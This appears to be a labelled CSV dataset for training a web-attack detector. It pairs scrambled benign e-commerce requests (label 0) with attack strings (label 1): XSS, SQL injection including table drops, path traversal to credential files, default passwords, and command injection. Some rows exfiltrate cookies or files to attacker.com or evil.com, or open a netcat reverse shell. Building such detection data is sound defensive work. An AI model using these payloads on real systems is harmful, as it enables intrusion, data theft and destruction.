text,label
<svg><script>alert(1)</script></svg>,1
invoice download for order req363,0
file:///etc/passwd,1
password and login with req635,0
<body background=javascript:alert(1)>,1
payment credit checkout with req577,0
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
`id`,1
1'; EXEC xp_cmdshell('whoami')--,1
view history 30 for req1004,0
javascript:alert(document.cookie),1
and password username req386,0
for account billing address req360,0
' HAVING 1=1--,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
profile account get for user req940,0
contact for refund request support req371,0
shipment tracking track req1015,0
format upload picture req191,0
<iframe src=javascript:alert('XSS')>,1
username=user&password=pass,1
learning machine about books search req754,0
news feed get latest articles req888,0
1'; DELETE FROM orders WHERE 1=1--,1
1; DROP TABLE users--,1
at checkout apply req474,0
with password login and username req913,0
register new with account email req318,0
<body onload=alert('XSS')>,1
"1 UNION SELECT username,password FROM users--",1
GET /backup.sql HTTP/1.1,1
& net user hacker Password1 /add,1
"<IMG SRC=`javascript:alert(""XSS"")`>",1
username=admin&password=password,1
username=admin&password=123456,1
../../../../var/www/html/config.php,1
<a href='javascript:alert(1)'>click</a>,1
<details open ontoggle=alert(1)>,1
view recommendations based on history req905,0
1' AND SLEEP(5)--,1
<audio src=1 onerror=alert(1)>,1
GET /.env HTTP/1.1,1
../../wp-config.php,1
1'; DELETE FROM orders WHERE 1=1--,1
password=1' OR '1'='1' /*,1
password spray attack detected multiple users,1
; ping -c 4 attacker.com,1
category electronics products by for req782,0
<iframe src=javascript:alert('XSS')>,1
1'; DELETE FROM orders WHERE 1=1--,1
../../../../etc/passwd,1
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
30 for days history req1194,0
' HAVING 1=1--,1
GET /robots.txt scan probe reconnaissance,1
<input onfocus=alert(1) autofocus>,1
| uname -a,1
credit payment with card checkout req1100,0
"<IMG SRC=`javascript:alert(""XSS"")`>",1
days view last for history req524,0
login password with and username req361,0
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
1'; WAITFOR DELAY '0:0:5'--,1
"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
; cat /etc/shadow,1
1' GROUP BY 1--,1
GET /crossdomain.xml HTTP/1.1,1
' OR 'x'='x,1
username=admin&password=superman,1
notification panel view settings req117,0
../../../../etc/passwd,1
login attempt failed username admin invalid credentials,1
/etc/passwd%00,1
| uname -a,1
GET /console HTTP/1.1,1
1' GROUP BY 1--,1
to preference set express req540,0
profile upload jpeg format req1124,0
"1 UNION SELECT username,password FROM users--",1
discount apply at req170,0
rate review 5 req664,0
by filter brand req755,0
brute force attempt on login endpoint from single ip,1
<details open ontoggle=alert(1)>,1
"<IMG SRC=`javascript:alert(""XSS"")`>",1
; id,1
100 price by filter range to req2,0
name apply filter by brand req237,0
report as csv data export req1094,0
username=admin&password=admin123,1
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
/var/log/apache2/access.log,1
"1' UNION ALL SELECT NULL,NULL,NULL--",1
; curl http://evil.com/$(cat /etc/passwd | base64),1
..\..\..\windows\system32\drivers\etc\hosts,1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
map on locations store req553,0
logout session current from req272,0
../../../../proc/self/environ,1
username=admin&password=qwerty,1
email register with account new req303,0
brute force attempt on login endpoint from single ip,1
username=admin&password=letmein,1
password spray attack detected multiple users,1
<body background=javascript:alert(1)>,1
<details open ontoggle=alert(1)>,1
<SCRIPT>alert('XSS')</SCRIPT>,1
from session current logout req458,0
contact request for req350,0
sort arrivals newest by req243,0
<body onload=alert('XSS')>,1
GET /server-status HTTP/1.1,1
"name='; INSERT INTO users VALUES('hacker','pass')--",1
two authentication enable factor req606,0
../.env,1
; ping -c 4 attacker.com,1
$(whoami),1
30 for order last req530,0
<a href='javascript:alert(1)'>click</a>,1
../../wp-config.php,1
<details open ontoggle=alert(1)>,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
section related view products req932,0
and login username password req1050,0
GET /crossdomain.xml HTTP/1.1,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
session current from logout req18,0
"<IMG SRC=`javascript:alert(""XSS"")`>",1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
website submit for form req446,0
support refund request for contact req1171,0
/etc/passwd%00,1
for submit website req7,0
picture upload profile jpeg format req376,0
browse mobile category phones req423,0
username=admin&password=password,1
"1' UNION ALL SELECT NULL,NULL,NULL--",1
products by category electronics req820,0
../../../../etc/passwd,1
admin'--,1
; cat /etc/shadow,1
../.env,1
by listing sort newest arrivals req1043,0
username=admin&password=1234567890,1
GET /api/swagger.json HTTP/1.1,1
<svg onload=alert(document.domain)>,1
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
username=admin&password=monkey,1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
recommendations on history req1090,0
1' AND SLEEP(5)--,1
<svg onload=alert(document.domain)>,1
language change arabic to account req814,0
1'; DELETE FROM orders WHERE 1=1--,1
"<iframe src=data:text/html,<script>alert(1)</script>>",1
apply brand filter name by req389,0
GET /backup.sql HTTP/1.1,1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
account arabic language to change req124,0
username=admin&password=abc123,1
account new with register req93,0
| wget http://attacker.com/shell.sh,1
php://filter/convert.base64-encode/resource=config.php,1
username=root&password=root,1
factor two authentication enable req561,0
username=admin&password=batman,1
username=admin&password=abc123,1
account arabic language req44,0
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
; whoami,1
link media product social via share req1072,0
/var/log/apache2/access.log,1
view policy product return for req988,0
feed news latest articles get req138,0
username=user&password=pass,1
../../../etc/shadow,1
; whoami,1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
<body background=javascript:alert(1)>,1
upload format profile picture jpeg req918,0
<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
; ls -la,1
send message seller to req1147,0
../../../../etc/passwd,1
multiple failed login attempts detected for admin,1
id=2 OR 1=1,1
"1 UNION SELECT @@version,NULL--",1
<textarea onfocus=alert(1) autofocus>,1
GET /config.bak HTTP/1.1,1
javascript:alert(document.cookie),1
GET /config.bak HTTP/1.1,1
password spray attack detected multiple users,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
and username login req392,0
username=admin&password=admin123,1
password with username login and req89,0
<svg><script>alert(1)</script></svg>,1
1' AND SLEEP(5)--,1
get news latest articles req1092,0
wishlist later item to save req413,0
GET /.env HTTP/1.1,1
username=admin&password=1234567890,1
1'; DELETE FROM orders WHERE 1=1--,1
username with login and req617,0
../../../etc/shadow,1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
<svg><script>alert(1)</script></svg>,1
"; python -c 'import socket,subprocess'",1
browse category mobile phones req153,0
filter name brand by apply req202,0
GET /api/swagger.json HTTP/1.1,1
recommendations based on history view req912,0
1' GROUP BY 1--,1
; whoami,1
learning machine search books req390,0
../.env,1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
GET /.htaccess HTTP/1.1,1
multiple failed login attempts detected for admin,1
username=admin&password=admin123,1
related view products section req84,0
track with tracking shipment req246,0
1' OR '1'='1,1
' HAVING 1=1--,1
"id=1 AND 1=CONVERT(int,@@version)--",1
contact support for refund request req267,0
products category search for req217,0
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
GET /robots.txt scan probe reconnaissance,1
compare products two specifications req786,0
rate review product req1196,0
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
sort newest arrivals listing by req565,0
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
rate stars 5 product review req487,0
specifications compare products two req761,0
1' AND SLEEP(5)--,1
set preference to express delivery req1083,0
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
"; python -c 'import socket,subprocess'",1
"1 UNION SELECT @@version,NULL--",1
../../.git/config,1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
../../.git/config,1
and login username with password req738,0
via social product share link media req678,0
account dashboard for get user req266,0
../.env,1
id=2 OR 1=1,1
card credit payment checkout with req1130,0
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
register new email req27,0
1' OR 1=1--,1
login password with req198,0
link via password reset email req228,0
<script>alert('XSS')</script>,1
; ls -la,1
php://filter/convert.base64-encode/resource=config.php,1
two factor authentication enable req1006,0
"<iframe src=data:text/html,<script>alert(1)</script>>",1
<video src=1 onerror=alert(1)>,1
....//....//etc/passwd,1
form for website submit feedback req882,0
brand filter by req206,0
' HAVING 1=1--,1
<SCRIPT>alert('XSS')</SCRIPT>,1
factor enable authentication two req573,0
listing sort by req966,0
<textarea onfocus=alert(1) autofocus>,1
item id 42 product add req434,0
listing by arrivals sort newest req658,0
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
|| nc -e /bin/sh attacker.com 4444,1
<video src=1 onerror=alert(1)>,1
cart item to req1,0
about search books learning machine req83,0
upload jpeg picture profile format req372,0
& net user hacker Password1 /add,1
<audio src=1 onerror=alert(1)>,1
mobile phones category req655,0
<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
compare two products specifications req856,0
<object data=javascript:alert(1)>,1
; ping -c 4 attacker.com,1
<input onfocus=alert(1) autofocus>,1
& net user hacker Password1 /add,1
specifications two products compare req744,0
filter brand apply by name req551,0
language arabic to account req225,0
shipment tracking track number with req623,0
..%2F..%2F..%2Fetc%2Fpasswd,1
' HAVING 1=1--,1
order update shipping req874,0
username=root&password=root,1
view recommendations history based on req125,0
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
<object data=javascript:alert(1)>,1
username=test&password=test,1
locations map on store view req454,0
username=admin&password=123456,1
<SCRIPT>alert('XSS')</SCRIPT>,1
1' ORDER BY 10--,1
1' ORDER BY 10--,1
tracking with track number req627,0
range filter to price results by req1075,0
username=admin&password=admin123,1
username=admin&password=superman,1
id add product item 42 req104,0
GET /api/swagger.json HTTP/1.1,1
jpeg format upload req186,0
for invoice download order req408,0
GET /wp-admin HTTP/1.1,1
"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
with register account new req873,0
GET /phpmyadmin HTTP/1.1,1
<script>alert('XSS')</script>,1
GET /wp-admin HTTP/1.1,1
<ScRiPt>alert(1)</ScRiPt>,1
based on recommendations history view req560,0
view 30 order req157,0
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
settings notification panel view req541,0
product link share social media req493,0
apply discount at checkout coupon req939,0
sort listing newest arrivals by req609,0
report data as req772,0
billing for address req742,0
register new with email req422,0
<select onfocus=alert(1) autofocus>,1
<object data=javascript:alert(1)>,1
1' OR 1=1--,1
"';alert(String.fromCharCode(88,83,83))//",1
for feedback website req1079,0
export csv report data as req471,0
new with account req1151,0
arrivals listing by newest sort req1021,0
account with new register email req765,0
via media share product link req624,0
electronics for products category search req1014,0
"1 UNION SELECT @@version,NULL--",1
username=admin&password=batman,1
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
update address order for req1185,0
"';alert(String.fromCharCode(88,83,83))//",1
1' GROUP BY 1--,1
account address update billing for req32,0
../../wp-config.php,1
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
| cat /etc/passwd,1
; whoami,1
subscribe with email to newsletter req55,0
"<iframe src=data:text/html,<script>alert(1)</script>>",1
"1 UNION SELECT username,password FROM users--",1
password spray attack detected multiple users,1
two compare products req516,0
GET /admin/config.php HTTP/1.1,1
|| nc -e /bin/sh attacker.com 4444,1
policy view product for return req449,0
view on store locations req538,0
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
"<IMG SRC=`javascript:alert(""XSS"")`>",1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
username=admin'/*,1
username=admin&password=qwerty,1
<svg><script>alert(1)</script></svg>,1
; ls -la,1
/etc/passwd%00,1
username=admin&password=admin,1
../../../etc/shadow,1
<input onfocus=alert(1) autofocus>,1
GET /.htaccess HTTP/1.1,1
username=root&password=root,1
return product view policy for req129,0
& ipconfig,1
1' GROUP BY 1--,1
../../../../etc/passwd,1
category mobile phones browse req547,0
authentication factor two enable req164,0
brand by name apply filter req1166,0
../../../../var/www/html/config.php,1
GET /api/swagger.json HTTP/1.1,1
from logout session req812,0
1' OR '1'='1,1
for store availability check item req23,0
' OR 1=1#,1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
username=admin&password=admin,1
search learning about req662,0
"name='; INSERT INTO users VALUES('hacker','pass')--",1
' HAVING 1=1--,1
website form feedback submit for req445,0
; curl http://evil.com/$(cat /etc/passwd | base64),1
to email subscribe with newsletter req746,0
"id=1 AND 1=CONVERT(int,@@version)--",1
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
"id=1 AND 1=CONVERT(int,@@version)--",1
username=admin&password=superman,1
"<iframe src=data:text/html,<script>alert(1)</script>>",1
express delivery to set preference req926,0
website feedback form req1024,0
with credit checkout req637,0
language to arabic change req28,0
username=admin&password=superman,1
phones category browse req507,0
GET /admin/config.php HTTP/1.1,1
GET /actuator/env HTTP/1.1,1
"<IMG SRC=`javascript:alert(""XSS"")`>",1
to arabic account language change req347,0
$(whoami),1
multiple failed login attempts detected for admin,1
1'; EXEC xp_cmdshell('whoami')--,1
view and conditions page terms req415,0
notification settings view panel req36,0
GET /server-status HTTP/1.1,1
1' ORDER BY 10--,1
last view order req762,0
1' GROUP BY 1--,1
username=root&password=root,1
arrivals listing newest by req438,0
%3Cscript%3Ealert(1)%3C/script%3E,1
username=admin&password=batman,1
admin' AND 1=1--,1
<video src=1 onerror=alert(1)>,1
| cat /etc/passwd,1
1'; WAITFOR DELAY '0:0:5'--,1
%3Cscript%3Ealert(1)%3C/script%3E,1
<img src=x onerror=alert(1)>,1
"';alert(String.fromCharCode(88,83,83))//",1
refund support for req145,0
brute force attempt on login endpoint from single ip,1
1'; DELETE FROM orders WHERE 1=1--,1
factor two enable authentication req890,0
username=admin&password=letmein,1
view notification settings panel req9,0
link share media social product via req872,0
product social share link via req1084,0
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
"<iframe src=data:text/html,<script>alert(1)</script>>",1
; ping -c 4 attacker.com,1
news get latest articles req1188,0
related section products view req482,0
feed articles news latest req1023,0
password=1' OR '1'='1' /*,1
map store on req463,0
../../../../proc/self/environ,1
username=admin&password=qwerty,1
"<iframe src=data:text/html,<script>alert(1)</script>>",1
<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
../../wp-config.php,1
number for download req208,0
"1 AND 1=2 UNION SELECT 1,2,3--",1
<body onload=alert('XSS')>,1
newest arrivals sort by req546,0
1'; WAITFOR DELAY '0:0:5'--,1
search about books learning machine req307,0
for order invoice download req716,0
GET /crossdomain.xml HTTP/1.1,1
"<iframe src=data:text/html,<script>alert(1)</script>>",1
to later save for item wishlist req690,0
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
section related view products req173,0
<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
via product media social link req1000,0
<iframe src=javascript:alert('XSS')>,1
<details open ontoggle=alert(1)>,1
username=admin'/*,1
....//....//etc/passwd,1
compare specifications two products req778,0
filter by brand req56,0
file:///etc/passwd,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
; whoami,1
& ipconfig,1
password spray attack detected multiple users,1
/etc/passwd%00,1
login username password and with req558,0
<svg onload=alert(document.domain)>,1
; whoami,1
GET /api/swagger.json HTTP/1.1,1
<div onmouseover=alert(1)>hover</div>,1
arabic change to req1170,0
username=administrator&password=12345,1
GET /crossdomain.xml HTTP/1.1,1
password email link via reset req676,0
export data as report csv req383,0
and view terms page req983,0
email newsletter to with subscribe req314,0
`id`,1
on based view history recommendations req369,0
"1 AND 1=2 UNION SELECT 1,2,3--",1
1' OR '1'='1,1
GET /phpmyadmin HTTP/1.1,1
username=admin&password=batman,1
1'; EXEC xp_cmdshell('whoami')--,1
authentication factor two enable req937,0
<object data=javascript:alert(1)>,1
/var/log/apache2/access.log,1
at coupon discount req1129,0
store locations map on view req1174,0
username=admin&password=1234567890,1
<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
1' GROUP BY 1--,1
review rate product stars req749,0
GET /robots.txt scan probe reconnaissance,1
GET /web.config HTTP/1.1,1
GET /crossdomain.xml HTTP/1.1,1
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
rate stars review req216,0
search machine about books req1095,0
1'; EXEC xp_cmdshell('whoami')--,1
../.env,1
username=admin&password=123456,1
for account update req636,0
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
file:///etc/passwd,1
username=admin&password=batman,1
rate review product req522,0
<video src=1 onerror=alert(1)>,1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
1' AND SLEEP(5)--,1
username=admin&password=letmein,1
"1 UNION SELECT @@version,NULL--",1
; curl http://evil.com/$(cat /etc/passwd | base64),1
session from logout req699,0
view conditions terms req196,0
GET /web.config HTTP/1.1,1
rate 5 product review req1110,0
<input onfocus=alert(1) autofocus>,1
update address billing for req1155,0
"1' UNION ALL SELECT NULL,NULL,NULL--",1
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
GET /crossdomain.xml HTTP/1.1,1
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
' HAVING 1=1--,1
<video src=1 onerror=alert(1)>,1
../.env,1
username=user&password=pass,1
GET /phpmyadmin HTTP/1.1,1
../../../../etc/passwd,1
with register new email account req910,0
& ipconfig,1
5 rate product req401,0
enable factor two authentication req40,0
username=admin&password=abc123,1
email link password req924,0
notification view settings req599,0
; ls -la,1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
../../../../etc/passwd,1
' OR 'x'='x,1
& ipconfig,1
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
`id`,1
check availability for item req450,0
"';alert(String.fromCharCode(88,83,83))//",1
username=admin&password=batman,1
history order days 30 view req1106,0
GET /web.config HTTP/1.1,1
/etc/passwd%00,1
mobile phones browse category req106,0
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
username=admin&password=superman,1
& net user hacker Password1 /add,1
| cat /etc/passwd,1
1'; WAITFOR DELAY '0:0:5'--,1
by brand apply name filter req671,0
<ScRiPt>alert(1)</ScRiPt>,1
1'; WAITFOR DELAY '0:0:5'--,1
account address for billing req789,0
with credit payment checkout card req1103,0
by name brand apply filter req289,0
jpeg upload format profile req834,0
<a href='javascript:alert(1)'>click</a>,1
login attempt failed username admin invalid credentials,1
1; DROP TABLE users--,1
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
by electronics for search category products req341,0
"<IMG SRC=`javascript:alert(""XSS"")`>",1
"1 UNION SELECT @@version,NULL--",1
view terms conditions and page req668,0
username=admin&password=password,1
for view policy req1067,0
5 review stars req1044,0
<script>alert('XSS')</script>,1
arabic language account change req304,0
username=admin'/*,1
by brand apply req526,0
link product media req1136,0
1' OR 1=1--,1
seller to message support send req884,0
<object data=javascript:alert(1)>,1
& net user hacker Password1 /add,1
5 stars rate product review req881,0
GET /config.bak HTTP/1.1,1
view terms and conditions page req580,0
username=administrator&password=12345,1
report data export csv as req150,0
address account billing update for req971,0
5 product rate req183,0
conditions page and req405,0
GET /web.config HTTP/1.1,1
<video src=1 onerror=alert(1)>,1
username=admin&password=batman,1
' OR 'x'='x,1
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
<svg onload=alert(document.domain)>,1
number for invoice download order req572,0
<script>alert('XSS')</script>,1
"<iframe src=data:text/html,<script>alert(1)</script>>",1
1' ORDER BY 10--,1
<div onmouseover=alert(1)>hover</div>,1
invoice for order number download req189,0
' OR 'x'='x,1
| uname -a,1
with card payment credit req0,0
..\..\..\windows\system32\drivers\etc\hosts,1
| cat /etc/passwd,1
<img src=x onerror=alert(1)>,1
username=admin'/*,1
username=admin&password=password,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
/etc/passwd%00,1
account with email new register req346,0
based history on recommendations view req143,0
articles latest news get feed req1051,0
repeated authentication failure admin account locked,1
username=admin&password=batman,1
GET /.git/config HTTP/1.1,1
item to cart req844,0
GET /robots.txt scan probe reconnaissance,1
to newsletter with email req527,0
GET /.env HTTP/1.1,1
..\..\..\windows\system32\drivers\etc\hosts,1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
<audio src=1 onerror=alert(1)>,1
<svg><script>alert(1)</script></svg>,1
learning books about search req21,0
history view days 30 req737,0
page and view terms req740,0
username=admin&password=admin,1
GET /console HTTP/1.1,1
& ipconfig,1
<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
<object data=javascript:alert(1)>,1
for address shipping req261,0
username=admin&password=password,1
<details open ontoggle=alert(1)>,1
GET /config.bak HTTP/1.1,1
<object data=javascript:alert(1)>,1
username=admin&password=superman,1
add id to req80,0
"1' UNION ALL SELECT NULL,NULL,NULL--",1
shipment tracking number track with req757,0
"<iframe src=data:text/html,<script>alert(1)</script>>",1
GET /phpmyadmin HTTP/1.1,1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
filter by 500 results 100 price req407,0
at coupon apply discount checkout req512,0
login attempt failed username admin invalid credentials,1
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
brute force attempt on login endpoint from single ip,1
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
admin'--,1
related products view section req741,0
factor enable two authentication req387,0
GET /.env HTTP/1.1,1
<ScRiPt>alert(1)</ScRiPt>,1
../../wp-config.php,1
username=admin&password=monkey,1
seller to support send message req94,0
username=admin&password=123456,1
../../../../etc/passwd,1
<iframe src=javascript:alert('XSS')>,1
section related view products req499,0
; id,1
history last for order req477,0
item availability check req491,0
support request contact for refund req47,0
1' OR 1=1--,1
<iframe src=javascript:alert('XSS')>,1
search by electronics products category for req1127,0
' OR 1=1#,1
..\..\..\windows\system32\drivers\etc\hosts,1
arabic language to change account req367,0
1' ORDER BY 10--,1
review rate stars product req706,0
admin'--,1
../../../etc/shadow,1
GET /robots.txt scan probe reconnaissance,1
username=admin&password=abc123,1
filter apply brand by name req486,0
mobile category phones browse req139,0
GET /.git/config HTTP/1.1,1
"name='; INSERT INTO users VALUES('hacker','pass')--",1
100 filter results range req608,0
1' OR '1'='1,1
' HAVING 1=1--,1
<object data=javascript:alert(1)>,1
and terms conditions page view req480,0
; whoami,1
GET /robots.txt scan probe reconnaissance,1
<img src=x onerror=alert(1)>,1
1' OR 1=1--,1
5 rate product stars review req393,0
to message support send seller req230,0
GET /actuator/env HTTP/1.1,1
password=1' OR '1'='1' /*,1
username=admin&password=letmein,1
via share product social link media req604,0
|| nc -e /bin/sh attacker.com 4444,1
brute force attempt on login endpoint from single ip,1
1' OR 1=1--,1
brute force attempt on login endpoint from single ip,1
file:///etc/passwd,1
logout from session current req893,0
policy product for return view req859,0
checkout coupon at apply discount req593,0
GET /admin/config.php HTTP/1.1,1
<body background=javascript:alert(1)>,1
<img src=x onerror=alert(1)>,1
| uname -a,1
username=admin&password=monkey,1
view based on history recommendations req670,0
<object data=javascript:alert(1)>,1
"1 UNION SELECT username,password FROM users--",1
$(whoami),1
username=admin&password=123456,1
; whoami,1
page and view req536,0
locations view on req398,0
"1 UNION SELECT @@version,NULL--",1
username=administrator&password=12345,1
& ipconfig,1
seller to message support send req1156,0
for support refund contact request req1159,0
<a href='javascript:alert(1)'>click</a>,1
file:///etc/passwd,1
GET /wp-admin HTTP/1.1,1
1'; WAITFOR DELAY '0:0:5'--,1
$(whoami),1
%3Cscript%3Ealert(1)%3C/script%3E,1
1' ORDER BY 10--,1
1' OR '1'='1,1
1' GROUP BY 1--,1
<ScRiPt>alert(1)</ScRiPt>,1
newest sort by arrivals req88,0
get feed articles req652,0
' OR 1=1#,1
1' OR '1'='1,1
<textarea onfocus=alert(1) autofocus>,1
rate stars 5 req733,0
dashboard profile account get for req215,0
change language arabic to account req921,0
set preference to req862,0
../../.git/config,1
../../wp-config.php,1
with to newsletter subscribe email req240,0
1; DROP TABLE users--,1
card with credit checkout payment req1193,0
"<iframe src=data:text/html,<script>alert(1)</script>>",1
machine books learning req883,0
javascript:alert(document.cookie),1
GET /.htaccess HTTP/1.1,1
two enable factor authentication req1120,0
user account get req505,0
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
; ls -la,1
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
username=admin&password=admin,1
latest get feed articles news req140,0
learning machine books search about req597,0
/var/log/apache2/access.log,1
username=admin&password=superman,1
..\..\..\windows\system32\drivers\etc\hosts,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
GET /api/swagger.json HTTP/1.1,1
category phones mobile browse req896,0
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
support for contact refund req592,0
1' OR '1'='1,1
<body background=javascript:alert(1)>,1
"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
filter brand by req37,0
1'; EXEC xp_cmdshell('whoami')--,1
account billing address for update req436,0
by filter name apply brand req909,0
username=admin&password=abc123,1
username=administrator&password=12345,1
<svg><script>alert(1)</script></svg>,1
media social link share via product req517,0
admin'--,1
1' AND SLEEP(5)--,1
1'; EXEC xp_cmdshell('whoami')--,1
1' OR '1'='1,1
order last history view for days req777,0
<audio src=1 onerror=alert(1)>,1
username=admin&password=1234567890,1
products specifications compare req253,0
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
../../wp-config.php,1
username=root&password=root,1
1' OR 1=1--,1
admin'--,1
product add 42 to id req521,0
username=admin'/*,1
login attempt failed username admin invalid credentials,1
specifications two compare products req475,0
order update address shipping for req770,0
username=administrator&password=12345,1
' OR 1=1#,1
with track number tracking shipment req365,0
filter brand by apply name req456,0
user dashboard account req359,0
format profile jpeg req1191,0
../.env,1
conditions and page req1061,0
about books machine learning search req915,0
store check item for availability req955,0
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
username=admin&password=letmein,1
1'; EXEC xp_cmdshell('whoami')--,1
"1' UNION ALL SELECT NULL,NULL,NULL--",1
../../../../etc/passwd,1
; curl http://evil.com/$(cat /etc/passwd | base64),1
login attempt failed username admin invalid credentials,1
GET /server-status HTTP/1.1,1
view history days req916,0
admin'--,1
track shipment tracking with req370,0
%3Cscript%3Ealert(1)%3C/script%3E,1
`id`,1
recommendations on history req556,0
shipment with tracking track req504,0
; cat /etc/shadow,1
for number order download invoice req1055,0
for download invoice number req902,0
name apply filter req1148,0
' OR 1=1#,1
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
new email account req656,0
settings notification panel view req119,0
1'; DELETE FROM orders WHERE 1=1--,1
track with tracking shipment number req432,0
at discount coupon req366,0
php://filter/convert.base64-encode/resource=config.php,1
item to for save later wishlist req866,0
view map store on locations req996,0
category by products for electronics search req986,0
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
../../../../var/www/html/config.php,1
credit checkout payment card with req473,0
<video src=1 onerror=alert(1)>,1
rate stars product review req688,0
